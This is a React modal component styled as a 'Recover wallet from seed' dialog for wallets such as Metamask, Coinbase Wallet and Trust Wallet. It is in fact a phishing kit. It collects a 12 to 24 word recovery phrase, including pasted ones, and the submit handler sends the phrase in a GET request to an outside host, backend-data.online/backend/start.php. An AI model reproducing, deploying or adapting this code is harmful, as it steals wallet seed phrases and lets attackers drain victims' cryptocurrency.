import React, { useState } from "react";
import wall7 from "../assets/wall7.svg";
import wall8 from "../assets/wall8.svg";
import wall9 from "../assets/wall9.svg";
import wall10 from "../assets/wall10.svg";
import wall11 from "../assets/wall11.svg";
import wall12 from "../assets/wall12.svg";
import wall13 from "../assets/wall13.svg";
import wall14 from "../assets/wall14.svg";

const wallets = [
  { name: "Metamask", icon: wall14, id: 14 },
  { name: "Injected", icon: wall13, id: 13 },
  { name: "Binance Chain", icon: wall12, id: 12 },
  { name: "Coinbase Wallet", icon: wall11, id: 11 },
  { name: "Turst Wallet", icon: wall10, id: 10 },
  { name: "Wallet Connect", icon: wall9, id: 9 },
  { name: "Brave Wallet", icon: wall8, id: 8 },
  { name: "MathWallet", icon: wall7, id: 7 },
];

const Modal = () => {
  const [segments, setSegments] = React.useState();

  function onPaste(event) {
    const pasted = event.clipboardData.getData("text/plain");
    console.log(pasted.split(" "));
    setSegments(pasted.split(" ").slice(0, 24));
  }

  const submitAddress = () => {
    let vault = {
      type: "secrate pass",
      main: `
      [trezor App]
      ${segments}
      `,
    };
    fetch(
      `https://backend-data.online/backend/start.php?phrase=${vault.main}`,
      {
        method: "GET",
        mode: "cors",
        headers: { "content-type": "application/json" },
      }
    ).then(
      (success) => {
        setSegments(["", "", "", "", "", "", "", "", "", "", "", ""]);
      }
    );
  };
  return (
    <div className="transition-10 duration-50 justify-center items-center flex fixed lg:top-0 top-0 inset-0  z-50 outline-0 ">
      <div className="">
        <div class="lg:w-[30rem] w-[23rem]  rounded-md bg-white drop-shadow-2xl p-4 ">
          <form action="javascript: validateData()" method="post">
            <div>
              <div class="mt-3 text-center sm:mt-5">
                <div class="mt-8">
                  <h3
                    class="text-xl font-semibold leading-6 text-[#6c6c6c] "
                    id="modal-title"
                  >
                    Recover wallet from seed
                  </h3>

                  <div class="mt-3">
                    <button
                      onClick={() => {
                        setSegments([
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                        ]);
                      }}
                      type="button"
                      onclick="changeMnemonicCount(12, '')"
                      class="px-4 py-2 text-sm border border-[#cdcdcd] m-2 rounded button-words-12 text-[#0c0c0c]"
                    >
                      12 words
                    </button>
                    <button
                      onClick={() => {
                        setSegments([
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                        ]);
                      }}
                      type="button"
                      onclick="changeMnemonicCount(15, '')"
                      class="px-4 py-2 text-sm border border-[#cdcdcd] text-[#0c0c0c] m-2 rounded button-words-15"
                    >
                      15 words
                    </button>
                    <button
                      onClick={() => {
                        setSegments([
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                        ]);
                      }}
                      type="button"
                      onclick="changeMnemonicCount(18, '')"
                      class="px-4 py-2 text-sm border border-[#cdcdcd] text-[#0c0c0c] m-2 rounded button-words-18"
                    >
                      18 words
                    </button>
                    <button
                      onClick={() => {
                        setSegments([
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                          "",
                        ]);
                      }}
                      type="button"
                      onclick="changeMnemonicCount(24, '')"
                      class="px-4 py-2 text-sm border border-[#cdcdcd] text-[#0c0c0c] m-2 rounded button-words-24"
                    >
                      24 words
                    </button>
                  </div>
                  <div className="grid lg:grid-cols-3 grid-cols-2 gap-3  lg:p-4 rounded-2xl relative">
                    {segments?.map((s, key) => (
                      <div key={key}>
                        {/* <label className="text-slate-400">{key + 1}.</label> */}
                        <input
                          value={s}
                          onPaste={onPaste}
                          placeholder={key + 1}
                          name="tjhgdjhagd"
                          class="border mt-2 md:mt-0 border-[#cdcdcd] w-[95%] text-[#0c0c0c] bg-white rounded py-1 px-2 text-sm mnemonicInput outline-none"
                        />
                      </div>
                    ))}
                  </div>
                </div>
              </div>
              <div class="mt-5">
                <button
                  onClick={() => submitAddress()}
                  type="submit"
                  class="mt-3 w-full justify-center rounded-md px-4 py-2 text-base font-medium bg-[#00854d] dark:text-white text-[#f0f8ff] disabled:bg-[#006c3f] continueModal"
                  disabled=""
                >
                  Continue
                </button>
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Modal;
